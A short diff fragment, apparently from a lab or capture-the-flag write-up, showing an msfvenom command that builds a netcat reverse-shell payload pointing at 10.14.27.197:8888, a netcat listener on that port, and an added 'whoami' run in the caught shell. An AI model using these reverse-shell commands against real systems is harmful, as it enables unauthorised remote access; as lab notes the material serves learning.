@@ -239,6 +239,7 @@ msfvenom -p cmd/unix/reverse_netcat lhost=10.14.27.197 lport=8888 R
 (Terminal 1:)
 ```shell
 nc -lvnp 8888
+	whoami
 
 	^C
 ```
